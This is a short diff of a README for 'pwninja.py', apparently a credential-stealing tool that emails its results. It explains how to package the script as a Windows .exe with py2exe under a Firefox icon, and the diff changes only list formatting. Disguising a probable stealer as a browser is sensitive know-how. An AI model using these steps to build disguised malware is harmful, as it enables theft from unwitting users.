@@ -9,13 +9,13 @@ senders and receive's  email address.
 Some Instructions regarding the conversion of 'pwninja.py' into .exe
 
 Required Files:
-1)	pwninja.py
-2)	setup.py
-3)	Firefox.ico
+-	pwninja.py
+-	setup.py
+-	Firefox.ico
 
 Command that need to be use:
 
-python setup.py py2exe
+- python setup.py py2exe
 
 after that you will see two folders in your pwninja directory
 one you are intrested in is 'dist' and in that folder you will see
